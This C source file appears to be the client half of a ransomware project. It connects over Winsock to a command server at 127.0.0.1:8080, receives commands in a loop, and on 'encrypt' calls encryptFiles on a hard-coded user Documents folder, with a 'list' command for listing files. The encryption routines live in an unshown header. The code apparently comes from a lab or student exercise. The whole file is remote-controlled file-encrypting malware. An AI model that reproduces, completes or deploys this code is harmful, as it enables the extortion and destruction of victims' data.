#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include "fonction.h"

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

void printClientBanner() {
    printf("        ___            __\n");
    printf("  _____/ (_)__  ____  / /_\n");
    printf(" / ___/ / / _ \\/ __ \\/ __/\n");
    printf("/ /__/ / /  __/ / / / /_  \n");
    printf("\\___/_/_/\\___/_/ /_/\\__/  \n");
    printf("\n");
}

void handleServerCommand(const char *command) {
    if (strcmp(command, "encrypt") == 0) {
        encryptFiles("C:\\Users\\user1\\OneDrive\\PC-Perso\\Documents");
    } else if (strcmp(command, "list") == 0) {
        listFiles();
    } else {
        printf("Unknown command received: %s\n", command);
    }
}

int main() {
    printClientBanner();
    WSADATA wsa;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    char serverMessage[1024], clientMessage[1024];

    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    // Create socket
    if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Could not create socket: %d\n", WSAGetLastError());
        return 1;
    }

    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);

    // Connect to server
    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        printf("Connection failed.\n");
        return 1;
    }
    printf("Connected to server.\n");

    // Main loop
    while (1) {
        // Receive command from server
        memset(serverMessage, 0, sizeof(serverMessage));
        if (recv(clientSocket, serverMessage, sizeof(serverMessage), 0) < 0) {
            printf("Failed to receive data from server.\n");
            break;
        }

        printf("Command received: %s\n", serverMessage);

        // Handle the command
        handleServerCommand(serverMessage);

        // Send acknowledgment to server
        snprintf(clientMessage, sizeof(clientMessage), "Client processed command: %s", serverMessage);
        if (send(clientSocket, clientMessage, strlen(clientMessage), 0) < 0) {
            printf("Failed to send acknowledgment to server.\n");
            break;
        }
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}
